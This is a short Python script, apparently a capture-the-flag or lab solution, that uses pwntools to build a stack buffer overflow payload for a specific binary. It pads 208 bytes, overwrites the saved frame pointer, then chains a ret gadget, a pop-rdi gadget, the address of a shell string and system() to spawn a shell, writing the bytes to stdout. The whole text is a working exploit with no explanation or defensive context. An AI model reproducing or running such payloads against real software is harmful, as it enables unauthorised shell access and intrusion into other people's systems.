from pwn import *

ret = 0x40101a
pop_rdi_ret = 0x401283
sh_address = 0x40204a
system = 0x401064

buf  = b'A' * 208
buf += b'\x42' * 8

buf += p64(ret)
buf += p64(pop_rdi_ret)
buf += p64(sh_address)
buf += p64(system)

sys.stdout.buffer.write(buf)